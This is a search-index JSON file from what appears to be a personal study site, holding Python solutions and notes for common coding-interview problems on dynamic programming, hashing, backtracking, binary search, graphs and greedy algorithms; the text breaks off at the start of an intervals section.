{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"Algorithms/1-D%20Dynamic%20Programming/","title":"1-D Dynamic Programming","text":""},{"location":"Algorithms/1-D%20Dynamic%20Programming/#1d-dynamic-programming","title":"1D Dynamic Programming","text":""},{"location":"Algorithms/1-D%20Dynamic%20Programming/#climbing-stairs","title":"Climbing Stairs","text":"<pre><code>class Solution:\n    def climbStairs(self, n: int) -&gt; int:\n        # 1,1,1\n        # 1,2\n        # 2,1\n\n        # i feel like sometimes is hard to find the recursion function\n        # dp = [0] * n\n\n        # for i in range(n):\n        #     dp[]\n\n        # n = 2, 2\n        # n =3, 3\n        # if u find the state function, then it will come eaisly\n        if n == 1:\n            return 1\n        first = 1\n        second = 2\n\n        for i in range(3,n+1):\n            third = first + second\n            first = second\n            second = third\n\n        return second\n\n        # def recursion(n, i):\n        #     if i == n:\n        #         print()\n        #         return 1\n        #     if i &gt; n:\n        #         return 0\n\n        #     return recursion(n, i+1) + recursion(n, i +2)\n\n        # return recursion(n,0)\n</code></pre>"},{"location":"Algorithms/1-D%20Dynamic%20Programming/#house-robber","title":"House Robber","text":"<pre><code>class Solution:\n    def rob(self, nums: List[int]) -&gt; int:\n        n = len(nums)\n        if n == 0:\n            return 0\n        if n == 1:\n            return nums[0]\n        if n == 2:\n            return max(nums[0], nums[1])\n\n        # dp = [0] * n\n        # dp[0] = nums[0]\n        # dp[1] = max(nums[0], nums[1])\n        prev2, prev1 = 0,0\n        prev2 = nums[0]\n        prev1 = max(nums[0], nums[1])\n\n        for i in range(2,n):\n            # dp[i] = max(dp[i-1], dp[i-2]+nums[i])\n            temp = max(prev1, nums[i] + prev2)\n            prev2 = prev1\n            prev1 = temp\n        return prev1\n</code></pre>"},{"location":"Algorithms/1-D%20Dynamic%20Programming/#house-robber-ii","title":"House Robber II","text":"<pre><code>class Solution:\n    def rob(self, nums: List[int]) -&gt; int:\n        #just treat this as either nums[:-1], not include the last number to end or nums[1:]\n        n = len(nums)\n        if n == 1:\n            return nums[0]\n        if n == 2:\n            return max(nums[0], nums[1])\n        def houserobber(arr):\n            # print(arr)\n            first,second = arr[0], max(arr[1], arr[0])\n            for i in range(2,n - 1):\n                temp = max(second, first + arr[i])\n                first = second\n                second = temp\n            return second\n\n        return max(houserobber(nums[:n-1]), houserobber(nums[1:]))\n</code></pre>"},{"location":"Algorithms/1-D%20Dynamic%20Programming/#longest-palindromic-substring","title":"Longest Palindromic Substring","text":"<pre><code>class Solution:\n    def longestPalindrome(self, s: str) -&gt; str:\n        def expandAroundCenter(left: int, right: int) -&gt; str:\n            while left &gt;= 0 and right &lt; len(s) and s[left] == s[right]:\n                left -= 1\n                right += 1\n            return s[(left + 1):right]  # The valid palindrome window, cuz left and right would go one step too far when condition fails\n\n        res = \"\"\n        for i in range(len(s)):\n            # Odd-length\n            odd = expandAroundCenter(i, i)\n            # Even-length\n            even = expandAroundCenter(i, i + 1)\n            # Pick the longer one\n            if len(odd) &gt; len(res):\n                res = odd\n            if len(even) &gt; len(res):\n                res = even\n        return res\n</code></pre>"},{"location":"Algorithms/1-D%20Dynamic%20Programming/#palindromic-substrings","title":"Palindromic Substrings","text":"<pre><code>class Solution:\n    def countSubstrings(self, s: str) -&gt; int:\n        #similar to the expansion,\n        count = 0\n        n = len(s)\n        def expansion(left,right):\n            temp_count = 0\n            while left &gt;= 0 and right &lt; n and s[left] == s[right]:\n                left -= 1\n                right += 1\n                temp_count += 1\n            return temp_count\n\n        for i in range(n):\n            count += expansion(i,i) #expansion from center\n            count += expansion(i,i+1) #even\n\n        return count\n</code></pre>"},{"location":"Algorithms/1-D%20Dynamic%20Programming/#decode-ways","title":"Decode Ways","text":"<pre><code>class Solution:\n    def numDecodings(self, s: str) -&gt; int:\n        # 2236, 2,2,3,6,  \n        n = len(s)\n        dp = [0] * (n+1)\n        dp[0] = 1\n        if s[0] != '0':\n            dp[1] = 1\n        else:\n            dp[1] = 0\n\n        for i in range(2,n+1):\n            one_digit = int(s[i - 1])\n            two_digits = int(s[i - 2:i])\n\n            if one_digit != 0:\n                dp[i] = dp[i - 1]\n\n            if 10 &lt;= two_digits &lt;= 26:\n                dp[i] += dp[i - 2]\n        print(dp)\n        return dp[n]\n</code></pre>"},{"location":"Algorithms/Arrays%20%26%20Hashing/","title":"Arrays & Hashing","text":""},{"location":"Algorithms/Arrays%20%26%20Hashing/#contains-duplicate","title":"Contains Duplicate","text":"<pre><code>class Solution:\n    def hasDuplicate(self, nums: List[int]) -&gt; bool:\n        nums_set = set()\n        for num in nums:\n            if num in nums_set:\n                return True\n            else:\n                nums_set.add(num)\n        return False\n</code></pre>"},{"location":"Algorithms/Arrays%20%26%20Hashing/#valid-anagram","title":"Valid Anagram","text":"<pre><code>class Solution:\n    def isAnagram(self, s: str, t: str) -&gt; bool:\n        #counter dict\n        s_count = Counter(s)\n        t_count = Counter(t)\n        return s_count == t_count\n</code></pre>"},{"location":"Algorithms/Arrays%20%26%20Hashing/#two-sum","title":"Two Sum","text":"<pre><code>class Solution:\n    def twoSum(self, nums: List[int], target: int) -&gt; List[int]:\n        num_table = {}\n\n        for index,num in enumerate(nums):\n            if target - num in num_table:\n                return [num_table[target-num], index]\n            else:\n                num_table[num] = index\n</code></pre>"},{"location":"Algorithms/Arrays%20%26%20Hashing/#group-anagrams","title":"Group Anagrams","text":"<pre><code>class Solution:\n    def groupAnagrams(self, strs: List[str]) -&gt; List[List[str]]:\n        res = defaultdict(list)\n        for s in strs:\n            count = [0] * 26\n            for c in s:\n                count[ord(c) - ord('a')] += 1\n            res[tuple(count)].append(s) # key has to be immutable\n        return list(res.values())\n</code></pre>"},{"location":"Algorithms/Arrays%20%26%20Hashing/#top-k-frequent-elements","title":"* Top K Frequent Elements","text":"<pre><code>class Solution:\n    def topKFrequent(self, nums: List[int], k: int) -&gt; List[int]:\n        #bucket sort\n        # an array to count the freq\n        nums_c = Counter(nums)\n        freq = [[] for _ in range(len(nums)+1)] #freq occur at most\n        #put cooresponding count to the freq\n        print(freq)\n        for val,count in nums_c.items():\n            freq[count].append(val)\n        print(freq)\n        res = []\n        for i in range(len(freq)-1,-1,-1):\n            if freq[i]:\n                for num in freq[i]:\n                    res.append(num)\n                    if len(res) == k:\n                        return res\n        return res\n</code></pre> <p>Heap Solution: T O(n * logk) , S O(n + k) - Where n is the length of the array and k is the number of top frequent elements.</p> <pre><code>        #another way is to maintain a window size heap\n        nums_c = Counter(nums)\n        #convert into a k size heap, then for the rest, compare if exists\n        res = []\n        for val,count in nums_c.items():\n            heapq.heappush(res,(count,val))\n            if len(res) &gt; k:\n                heapq.heappop(res)\n        final = []\n        for i in range(k):\n            count, val = heapq.heappop(res)\n            final.append(val)\n        return final\n</code></pre>"},{"location":"Algorithms/Arrays%20%26%20Hashing/#encode-and-decode-strings","title":"Encode and Decode Strings","text":"<p>This is a good question that appears in TCP data transfer when determines the data segments.</p> <pre><code>class Solution:\n\n    def encode(self, strs: List[str]) -&gt; str:\n        res = \"\"\n        for s in strs:\n            res += str(len(s)) + \"#\" + s\n        return res\n\n    def decode(self, s: str) -&gt; List[str]:\n        print(s)  # 4#neet4#code4#love3#you\n        res = []\n        i = 0\n\n        while i &lt; len(s):\n            j = i\n            while s[j] != '#':\n                j += 1\n            length = int(s[i:j])\n            i = j + 1\n            j = i + length\n            res.append(s[i:j])\n            i = j\n\n        return res\n</code></pre>"},{"location":"Algorithms/Arrays%20%26%20Hashing/#products-of-array-except-self","title":"* Products of Array Except Self","text":"<pre><code>class Solution:\n    def productExceptSelf(self, nums: List[int]) -&gt; List[int]:\n        #forward and backward\n        # 1 2 3 4\n        # 1 2 6 24 -&gt;prefix, forward order times 1\n        # 24 12 12 4 -&gt;postfix, reverse order times 1\n        # the answer is equal to the prefix * postfix  except that index val output\n        # so we can first store our prefix in res, then postfix to the current result O(1) time\n        prefix, postfix = 1,1\n        res = [0] * len(nums)\n        res[0] = prefix\n        n = len(nums)\n        for i in range(n):\n            res[i] = prefix\n            prefix = nums[i] * prefix\n\n        for i in range(n-1,-1,-1):\n            res[i] = res[i] * postfix\n            postfix = postfix * nums[i]\n        return res\n</code></pre> <ul> <li>Time complexity: O(n)O(n)</li> <li>Space complexity:</li> <li>O(1) extra space.</li> <li>O(n) space for the output array.</li> </ul>"},{"location":"Algorithms/Arrays%20%26%20Hashing/#valid-sudoku-simulation","title":"Valid Sudoku - Simulation","text":"<pre><code>class Solution:\n    def isValidSudoku(self, board: List[List[str]]) -&gt; bool:\n        #matrix question\n        #check diagonal, row, column\n        m = len(board)\n        n = len(board[0])\n\n        for i in range(m):\n            #set for duplicates\n            duplicate_set = set( [str(x) for x in range(1,10)])\n\n            for j in range(n):\n                if board[i][j] == '.': continue\n                if board[i][j] in duplicate_set:\n                    duplicate_set.remove(board[i][j])\n                else:\n                    return False\n\n\n        for i in range(n):\n            duplicate_set = set( [str(x) for x in range(1,10)])\n            for j in range(m):\n                if board[j][i] == '.': continue\n                if board[j][i] in duplicate_set:\n                    duplicate_set.remove(board[j][i])\n                else:\n                    return False\n\n        #check the square, know 9*9, 9 loops\n        for i in range(9): # 0,1,2  3,4,5 // 3   6,7,8 -&gt;2\n            start_row = i // 3 * 3\n            start_index = i % 3 * 3\n            duplicate_set = set( [str(x) for x in range(1,10)])\n            for j in range(9):\n                row = j // 3 + start_row\n                col = j % 3 + start_index\n                print(row,col)\n                if board[row][col] == '.': continue\n                if board[row][col] in duplicate_set:\n                    duplicate_set.remove(board[row][col])\n                else:\n                    return False\n\n        return True\n</code></pre>"},{"location":"Algorithms/Arrays%20%26%20Hashing/#longest-consecutive-sequence","title":"* Longest Consecutive Sequence","text":"<p>The core idea is that we only need to check if an element is start of the consecutive sequence by comparing (num - 1) in the hashset, then check the incrementing and get the length</p> <pre><code>class Solution:\n    def longestConsecutive(self, nums: List[int]) -&gt; int:\n        # start with the num - 1, put the rest in  the set\n        nums = set(nums)\n        longest = 0\n        for num in nums:\n            if num-1 not in nums: #the start index\n                count = 0\n                while num in nums:\n                    count += 1\n                    num += 1\n                longest = max(longest, count)\n\n        return longest\n</code></pre>"},{"location":"Algorithms/Backtracking/","title":"Backtracking","text":""},{"location":"Algorithms/Backtracking/#subsets","title":"Subsets","text":"<pre><code>Input: nums = [1,2,3]\n\nOutput: [[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]\n</code></pre> <pre><code>class Solution:\n    def subsets(self, nums: List[int]) -&gt; List[List[int]]:\n        res = []\n\n        def backtrack(path, start):\n            res.append(path[:])  # Add current subset (copy)\n\n            for i in range(start, len(nums)):\n                path.append(nums[i])               # Choose\n                backtrack(path, i + 1)             # Explore (next element)\n                path.pop()                         # Un-choose (backtrack)\n\n        backtrack([], 0)\n        return res\n</code></pre>"},{"location":"Algorithms/Backtracking/#combination-sum","title":"* Combination Sum","text":"<pre><code>class Solution:\n    def combinationSum(self, candidates: List[int], target: int) -&gt; List[List[int]]:\n        res = []\n\n        def backtrack(path, remain, start):\n            if remain == 0:\n                res.append(path[:])\n                return\n            if remain &lt; 0:\n                return  # pruning\n\n            for i in range(start, len(candidates)):\n                path.append(candidates[i])\n                backtrack(path, remain - candidates[i], i)  # reuse same element\n                path.pop()\n\n        backtrack([], target, 0)\n        return res\n</code></pre>"},{"location":"Algorithms/Backtracking/#combination-sum-ii","title":"Combination Sum II","text":"<pre><code>class Solution:\n    def combinationSum2(self, candidates: List[int], target: int) -&gt; List[List[int]]:\n        res = []\n        candidates.sort()\n\n        def backtrack(candidates, remaining, path, start):\n            if remaining == 0:\n                res.append(path[:])\n                return\n            elif remaining &lt; 0: # prunning\n                return\n\n            for i in range(start, len(candidates)):\n                # i &gt; start, means we dont want to skip the first level in backtracking\n                # in 3 sums, we use i &gt; 0, but this case we also need to consider duplicates\n                if i &gt; start and candidates[i] == candidates[i - 1]:\n                    continue\n                path.append(candidates[i])\n                backtrack(candidates, remaining - candidates[i], path, i + 1)\n                path.pop()\n\n        backtrack(candidates, target, [], 0)\n        return res\n</code></pre> <p>There is also a faster approach, to learn</p> <pre><code>def permute(self, nums: List[int]) -&gt; List[List[int]]:\n    self.res = []\n    self.backtrack(nums, 0)\n    return self.res\n\ndef backtrack(self, nums: List[int], idx: int):\n    if idx == len(nums):\n        self.res.append(nums[:])\n        return\n    for i in range(idx, len(nums)):\n        nums[idx], nums[i] = nums[i], nums[idx]   # Swap\n        self.backtrack(nums, idx + 1)\n        nums[idx], nums[i] = nums[i], nums[idx]   # Swap back\n</code></pre>"},{"location":"Algorithms/Backtracking/#word-search","title":"* Word Search","text":"<pre><code>class Solution:\n    def exist(self, board: List[List[str]], word: str) -&gt; bool:\n        m, n = len(board), len(board[0])\n        directions = [[-1, 0], [1, 0], [0, -1], [0, 1]]\n\n        def dfs(r, c, index):\n            if index == len(word):\n                return True\n            if not (0 &lt;= r &lt; m and 0 &lt;= c &lt; n):\n                return False\n            if board[r][c] != word[index]:\n                return False\n\n            temp = board[r][c]\n            board[r][c] = \"#\"\n\n            for dr, dc in directions:\n                if dfs(r + dr, c + dc, index + 1):\n                    return True\n\n            board[r][c] = temp\n            return False\n\n        for i in range(m):\n            for j in range(n):\n                if dfs(i, j, 0):\n                    return True\n        return False\n</code></pre>"},{"location":"Algorithms/Backtracking/#n-queens","title":"N-Queens","text":"<p>The order for below code is that it first tried the first column and backtrack next row, since the col on the first row first column is taken it will try the second column, mean time it will also add the diagonal to the set and configure the board[r][c]. so it would return till the very top first row, second column once the r == n, and meantime it will revert all the previous changes</p> <pre><code>class Solution:\n    def solveNQueens(self, n: int) -&gt; List[List[str]]:\n        col = set()\n        posDiag = set()  # r + c\n        negDiag = set()  # r - c\n\n        res = []\n        board = [[\".\"] * n for _ in range(n)]\n\n        def backtrack(r):\n            if r == n:\n                copy = [\"\".join(row) for row in board]\n                res.append(copy)\n                return\n\n            for c in range(n):\n                if c in col or (r + c) in posDiag or (r - c) in negDiag:\n                    continue\n\n                col.add(c)\n                posDiag.add(r + c)\n                negDiag.add(r - c)\n                board[r][c] = \"Q\"\n\n                backtrack(r + 1)\n\n                col.remove(c)\n                posDiag.remove(r + c)\n                negDiag.remove(r - c)\n                board[r][c] = \".\"\n\n        backtrack(0)\n        return res\n</code></pre>"},{"location":"Algorithms/Binary%20Search/","title":"Binary Search","text":""},{"location":"Algorithms/Binary%20Search/#binary-search","title":"Binary Search","text":"<pre><code>class Solution:\n    def search(self, nums: List[int], target: int) -&gt; int:\n        # sorted -&gt; binary search\n        left = 0\n        right = len(nums) - 1\n        while left &lt;= right:\n            # mid = (left + right) // 2 # Possible overflow error\n            mid = left + (right - left) // 2\n            if nums[mid] == target:\n                return mid\n            elif nums[mid] &lt; target:\n                left = mid + 1\n            else:\n                right = mid - 1\n        return -1\n</code></pre>"},{"location":"Algorithms/Binary%20Search/#modified-binary-search","title":"Modified Binary Search","text":"<pre><code>def binary_search(arr: List[int], target: int) -&gt; int:\n    left, right = 0, len(arr) - 1\n    first_true_index = -1 # notice sometimes we need to return the value, an empty value/string might be better\n    while left &lt;= right:\n        mid = (left + right) // 2\n        if feasible(mid):\n            first_true_index = mid\n            right = mid - 1\n        else:\n            left = mid + 1\n\n    return first_true_index\n</code></pre>"},{"location":"Algorithms/Binary%20Search/#search-a-2d-matrix","title":"Search a 2D Matrix","text":"<p>We could use the 2D matrix property, first do binary search on the row. Compare the first index with target, if it is smaller, we know that we need to decrease our mid, if it is greater than the last index, then we increase our mid + 1. It will break if the row[0] &lt;= target &lt;= row[-1].</p> <pre><code>class Solution:\n    def searchMatrix(self, matrix: List[List[int]], target: int) -&gt; bool:\n        # a simple way would be just convert them to a 1D, but that would need more space, can we do better\n        # binary search on matrix\n        start, end = 0, len(matrix) - 1\n        row = -1\n        while start &lt;= end:\n            mid = (start + end) // 2\n            if target &gt; matrix[mid][-1]:\n                start = mid + 1\n            elif target &lt; matrix[mid][0]:\n                end = mid - 1\n            else:\n                break\n        row = (start + end) // 2\n\n        start, end = 0, len(matrix[0]) - 1\n        while start &lt;= end:\n            mid = (start + end) // 2\n            mid_val = matrix[row][mid]\n            if mid_val == target:\n                return True\n            elif mid_val &lt; target:\n                start = mid + 1\n            else:\n                end = mid - 1\n        return False\n</code></pre>"},{"location":"Algorithms/Binary%20Search/#koko-eating-bananas","title":"Koko Eating Bananas","text":"<p>We need to do define a function that count the number of bananas. Sometimes it might take some time to come up the idea, for this case, we need to realize since we are trying to find the minimum number up to the max value with in the array. A modifies binary search converge to the max value would be solution in this case.</p> <pre><code>class Solution:\n    def minEatingSpeed(self, piles: List[int], h: int) -&gt; int:\n        # most intutive way is start searching from 0 until it exceeds the condition\n        # start from lower increase by 1 till it stops\n\n        max_k = max(piles) # O(n)\n        low = 1\n\n        # modified binary search on the mininum\n        def count_bananas(k):\n            count = 0\n            for pile in piles:\n                if pile % k != 0:\n                    count += pile // k + 1\n                else:\n                    count += pile // k\n            print(count)\n            return count\n\n        min_k = -1\n        while low &lt;= max_k:\n            mid = (low + max_k) // 2\n\n            if count_bananas(mid) &lt;= h:\n                min_k = mid\n                max_k = mid - 1\n            else:\n                low = mid + 1\n\n        return min_k\n</code></pre>"},{"location":"Algorithms/Binary%20Search/#find-minimum-in-rotated-sorted-array","title":"Find Minimum in Rotated Sorted Array","text":"<ol> <li> <p>The array is partially sorted, but rotated at some pivot.</p> </li> <li> <p>We aim to search in the sorted portion where the minimum must lie.</p> </li> <li> <p>Observation:</p> </li> <li> <p>If <code>nums[l] &lt; nums[r]</code>, the subarray <code>[l..r]</code> is already sorted \u2192 minimum is <code>nums[l]</code>.</p> </li> <li>If <code>nums[mid] &lt; nums[r]</code>, the right half is sorted \u2192 minimum might be in the left half, including <code>mid</code>.</li> <li> <p>Else, the left half is sorted \u2192 minimum must be in the right half (excluding <code>mid</code>).</p> </li> <li> <p>Keep narrowing the range based on which half is sorted.</p> </li> </ol> <p>Always update <code>res</code> with the smallest seen so far: <code>res = min(res, nums[mid])</code>.</p> <p></p> <p></p> <pre><code>class Solution:\n    def findMin(self, nums: List[int]) -&gt; int:\n        # search in sorted array\n        # always search on the smaller sorted portion, nums[m] &lt; nums[r]\n\n        l, r = 0, len(nums) - 1\n        res = nums[l]\n\n        while l &lt;= r:\n            if nums[l] &lt; nums[r]:\n                res = min(res, nums[l])\n                return res\n\n            mid = (l + r) // 2\n            res = min(res, nums[mid])\n            if nums[mid] &gt;= nums[l]:\n                l = mid + 1\n            else:\n                r = mid - 1\n\n        return res\n</code></pre> <p>Another approach is modified binary search but </p>"},{"location":"Algorithms/Binary%20Search/#search-in-rotated-sorted-array","title":"* Search in Rotated Sorted Array","text":"<p>This question is similar to the last question, one mistake I made is that <code>if nums[mid] &gt;= nums[l]: # left sorted half</code> where I wrote <code>&gt;</code>, the idea to understand is that for some corner cases when mid == l, we still want to make sure it is within the left sorted half instead of the right half.</p> <pre><code>class Solution:\n    def search(self, nums: List[int], target: int) -&gt; int:\n        l, r = 0, len(nums) - 1\n\n        while l &lt;= r:\n            mid = (l + r) // 2\n            # print(mid)\n            if nums[mid] == target:\n                return mid\n\n            if nums[mid] &gt;= nums[l]: # left sorted half, notice greater equal sign\n                if nums[l] &lt;= target &lt;= nums[mid]:\n                    r = mid - 1\n                else: # not in the sorted half\n                    l = mid + 1\n            else: # right half is sorted\n                if nums[mid] &lt;= target &lt;= nums[r]:\n                    l = mid + 1\n                else:\n                    r = mid - 1\n\n        return -1\n</code></pre>"},{"location":"Algorithms/Binary%20Search/#time-based-key-value-store","title":"Time Based Key-Value Store","text":"<p>A key observation is that we can use a dictionary with the list as a value for data storing. And another thing is that when performing the modified binary search, if like the usual way storing the res as an index. It will return the last element if no value is found, which need to be careful for the -1 index.</p> <pre><code>class TimeMap:\n    def __init__(self):\n        # key: alice, [(1:happy), (3:sad)]\n        self.data = {}\n        # when we get, get the latest, largest that is less than\n\n    def set(self, key: str, value: str, timestamp: int) -&gt; None:\n        if key in self.data:\n            self.data[key].append((timestamp, value))\n        else:\n            self.data[key] = [(timestamp, value)]\n\n    def get(self, key: str, timestamp: int) -&gt; str:\n        if key in self.data:\n            #perform binary search\n            arr = self.data[key]\n            l, r = 0, len(arr) - 1\n            res = \"\"\n            while l &lt;= r:\n                mid = (l + r) // 2\n                if arr[mid][0] &lt;= timestamp:\n                    res = arr[mid][1]\n                    l = mid + 1\n                else:\n                    r = mid - 1\n            return res\n        else:\n            return \"\"\n</code></pre>"},{"location":"Algorithms/Binary%20Search/#median-of-two-sorted-arrays","title":"Median of Two Sorted Arrays","text":"<p>The core idea is about find the correct left and right partition.</p> <p>Below 3 pictures demonstrate the core idea. </p> <p></p> <p></p> <p></p> <pre><code>class Solution:\n    def findMedianSortedArrays(self, nums1: List[int], nums2: List[int]) -&gt; float:\n        # median\n        total = len(nums1) + len(nums2)\n        half = total // 2\n\n        A, B = nums1, nums2 # always bst on the lower half\n        if len(nums1) &gt; len(nums2):\n            A, B = nums2, nums1\n\n        l, r = 0, len(A) - 1\n\n        while True:\n            mid = (l + r) // 2\n            B_r = half - mid - 2 # cuz index starts 0\n\n            A_left = A[mid] if mid &gt;= 0 else float('-inf')\n            A_right = A[mid + 1] if mid + 1 &lt; len(A) else float('inf')\n            B_left = B[B_r] if B_r &gt;= 0 else float('-inf')\n            B_right = B[B_r + 1] if B_r + 1 &lt; len(B) else float('inf')\n\n            #the condition when it is true and we can break\n            if A_left &lt;= B_right and B_left &lt;= A_right:\n                if total % 2 == 0:\n                    print(A_left, B_left, A_right, B_right)\n                    return (max(A_left, B_left) + min(A_right, B_right)) / 2\n                else:\n                    return min(A_right, B_right)\n                break\n            elif B_left &gt; A_right:\n                l = mid + 1\n            else:\n                r = mid - 1\n\n        return -1 \n</code></pre>"},{"location":"Algorithms/Binary%20Search/#find-peak-element-lc162","title":"* Find Peak Element - LC162","text":"<p>Got this question in the interview,  https://leetcode.com/problems/find-peak-element/solutions/788474/general-binary-search-thought-process-4-templates/?envType=study-plan-v2&amp;envId=top-interview-150</p> <p>Actually lots of details for this problem, below version need to handle carefully with the mid pointer if we are checking the left neighbor, we basically need to increment the left pointer by one cuz it may otherwise cause the infinite loop.</p> <pre><code>class Solution:\n    def findPeakElement(self, nums: List[int]) -&gt; int:\n        left =0\n        right = len(nums)-1\n        while left &lt; right:\n            # Right biased mid as left = mid in else condition # prevent infinite loop\n            mid = left + (right - left + 1) //2 \n            if nums[mid] &gt; nums[mid-1]: # True condition # go right # inc function # Last True \n                left = mid # mid is a potential elem\n            else:\n                right = mid -1\n        return left\n</code></pre> <pre><code>class Solution:\n    def findPeakElement(self, nums: List[int]) -&gt; int:\n        left, right = 0, len(nums) - 1\n\n        while left &lt; right: \n            mid = (left + right) // 2\n            if nums[mid] &lt; nums[mid + 1]: # the reason why [mid + 1] is safe is cuz we dont need our boundary check is left &lt; right, since right is already defined with len(nums) -1, the max of mid would only be (right - 1), and for corner case once left = mid + 1, which it will equal to the right and end the loop.\n                # Peak must be on the right side\n                left = mid + 1\n            else:\n                # Peak is on the left side or could be mid\n                right = mid\n        return left  # or return right (same at end)\n</code></pre>"},{"location":"Algorithms/Binary%20Search/#summary","title":"Summary","text":"<p>Binary Search can get tricky at some times, but it's important to have the idea that once we need to find something in a sorted order\u2014even if not mentioned explicitly\u2014binary search should be the go-to approach since it has O(log n) time complexity. And make sure to clearly define the boundary conditions when applying modified binary search.</p> <p>The simplest way is to adopt a modified binary search pattern, but be careful about whether you are searching for a minimum or a maximum value.</p>"},{"location":"Algorithms/Binary%20Search/#find-minimum-valid-value-koko-banana-style","title":"Find Minimum Valid Value (Koko Banana Style)","text":"<pre><code>def min_k_that_satisfies_condition():\n    low, high = 1, max_val\n    res = -1\n\n    while low &lt;= high:\n        mid = (low + high) // 2\n        if is_valid(mid):  # condition is met\n            res = mid      # possible answer\n            high = mid - 1 # try smaller\n        else:\n            low = mid + 1  # need larger value\n\n    return res\n</code></pre>"},{"location":"Algorithms/Binary%20Search/#find-maximum-valid-value-eg-max-eating-speed-within-time","title":"Find Maximum Valid Value (e.g., max eating speed within time)","text":"<pre><code>def max_k_that_satisfies_condition():\n    low, high = 1, max_val\n    res = -1\n\n    while low &lt;= high:\n        mid = (low + high) // 2\n        if is_valid(mid):\n            res = mid        # possible answer\n            low = mid + 1    # try larger\n        else:\n            high = mid - 1   # need smaller\n\n    return res\n</code></pre>"},{"location":"Algorithms/Binary%20Search/#peak-element-unsorted-array-binary-search","title":"Peak Element / Unsorted Array Binary Search","text":"<p>Search in an unsorted array where condition is based on relative comparison, not a fixed target.</p> <p>Binary search for a peak based on neighbor comparison.</p> <pre><code>left, right = 0, len(nums) - 1\nwhile left &lt; right:\n    mid = (left + right) // 2\n    if nums[mid] &gt; nums[mid + 1]:\n        right = mid  # peak is on the left side (including mid)\n    else:\n        left = mid + 1  # peak is on the right side\nreturn left\n</code></pre>"},{"location":"Algorithms/Graphs/","title":"Graphs","text":""},{"location":"Algorithms/Graphs/#graph","title":"Graph","text":""},{"location":"Algorithms/Graphs/#dfs","title":"DFS","text":""},{"location":"Algorithms/Graphs/#bfs","title":"BFS","text":""},{"location":"Algorithms/Graphs/#number-of-islands","title":"Number of Islands","text":"<p>DFS is more preferred for this question</p> <pre><code>class Solution:\n    def numIslands(self, grid: List[List[str]]) -&gt; int:\n        # bfs\n        directions = [(-1, 0), (1, 0), (0, -1), (0, 1)]\n        m = len(grid)\n        n = len(grid[0])\n        count = 0\n\n        def dfs(i, j):\n            if not (0 &lt;= i &lt; m and 0 &lt;= j &lt; n):\n                return\n            if grid[i][j] != '1':\n                return\n            grid[i][j] = '0'    \n            for dx, dy in directions:\n                dfs(i + dx, j + dy)\n            return\n\n        for i in range(m):\n            for j in range(n):\n                if grid[i][j] == '1':\n                    dfs(i, j)\n                    count += 1\n\n        return count\n</code></pre> <p>BFS</p> <pre><code>class Solution:\n    def numIslands(self, grid: List[List[str]]) -&gt; int:\n        #adjacent horizontally and vertically\n        #notice it is char instead of int\n        #m,n is greater than 1\n        #can only be 0 and 1, char\n\n        m = len(grid)\n        n = len(grid[0])\n\n        edges = [(-1,0),(1,0),(0,-1),(0,1)]\n\n        def bfs(grid,i,j):\n            queue = deque([(i,j)])\n\n            while queue:\n                r,c = queue.popleft()\n                #check 4 directions\n                for dr,dc in edges:\n                    n_r,n_c = r+dr,c+dc\n                    if 0 &lt;= n_r &lt; len(grid) and 0 &lt;= n_c &lt; len(grid[0]) and grid[n_r][n_c] == '1':\n                        grid[n_r][n_c] = '0' #mark as visited\n                        queue.append((n_r,n_c))\n            # print(grid)\n\n        count = 0\n        #bfs constantly checking the grid\n        for i in range(m):\n            for j in range(n):\n                if grid[i][j] == '1':\n                    count += 1\n                    bfs(grid,i,j)\n\n        return count\n</code></pre>"},{"location":"Algorithms/Graphs/#clone-graph","title":"Clone Graph","text":"<pre><code>class Solution:\n    def cloneGraph(self, node: Optional['Node']) -&gt; Optional['Node']:\n        oldToNew = {}\n\n        def dfs(node):\n            if node in oldToNew:\n                return oldToNew[node]\n\n            copy = Node(node.val)\n            oldToNew[node] = copy\n            for nei in node.neighbors:\n                copy.neighbors.append(dfs(nei))\n            return copy\n\n        return dfs(node) if node else None\n</code></pre>"},{"location":"Algorithms/Graphs/#course-schedule","title":"* Course Schedule","text":"<pre><code>class Solution:\n    def canFinish(self, numCourses: int, prerequisites: List[List[int]]) -&gt; bool:\n        indegree = [0] * numCourses\n        adj = [[] for i in range(numCourses)]\n        for src, dst in prerequisites:\n            indegree[dst] += 1\n            adj[src].append(dst)\n\n        q = deque()\n        for n in range(numCourses):\n            if indegree[n] == 0:\n                q.append(n)\n\n        finish = 0\n        while q:\n            node = q.popleft()\n            finish += 1\n            for nei in adj[node]:\n                indegree[nei] -= 1\n                if indegree[nei] == 0:\n                    q.append(nei)\n\n        return finish == numCourses\n</code></pre>"},{"location":"Algorithms/Graphs/#number-of-connected-components-in-an-undirected-graph","title":"* Number of Connected Components in an Undirected Graph","text":"<p>DFS, Union find is more preferred for this problem</p> <pre><code>class Solution:\n    def countComponents(self, n: int, edges: List[List[int]]) -&gt; int:\n        adj = [[] for _ in range(n)]\n        visit = [False] * n\n        for u, v in edges:\n            adj[u].append(v)\n            adj[v].append(u)\n\n        def dfs(node):\n            for nei in adj[node]:\n                if not visit[nei]:\n                    visit[nei] = True\n                    dfs(nei)\n\n        res = 0\n        for node in range(n):\n            if not visit[node]:\n                visit[node] = True\n                dfs(node)\n                res += 1\n        return res\n</code></pre>"},{"location":"Algorithms/Greedy/","title":"Greedy","text":""},{"location":"Algorithms/Greedy/#maximum-subarray-kadanes-algorithm","title":"* Maximum Subarray - Kadane's Algorithm","text":"<pre><code>class Solution:\n    def maxSubArray(self, nums: List[int]) -&gt; int:\n        largest = float('-inf')\n        window_sum = 0\n        for num in nums:\n            # compare the sum so far with the current\n            # if num &gt; (num + window_sum):\n            #     window_sum = num\n            # else:\n            #     window_sum += num    \n            window_sum = max(num, num + window_sum)\n            largest = max(largest, window_sum)\n        return largest\n</code></pre>"},{"location":"Algorithms/Greedy/#jump-game","title":"Jump Game","text":"<pre><code>class Solution:\n    def canJump(self, nums: List[int]) -&gt; bool:\n        # we can go reverse order, check if goal index can get reduce to zero\n        goal = len(nums) - 1 # notice reach the last index\n\n        for i in range(len(nums) - 1, -1, -1): # len(nums) - 2, this also works and actually better\n            print(goal, nums[i] + i)\n            if nums[i] + i &gt;= goal:\n                goal = i\n\n        return True if goal == 0 else False\n</code></pre>"},{"location":"Algorithms/Intervals/","title":"Intervals","text":""},{"location":"Algorithms/Intervals/#insert-interval","title":"Insert Interval","text":""},{"location":"Algorithms/Intervals/#merge-intervals","title":"Merge 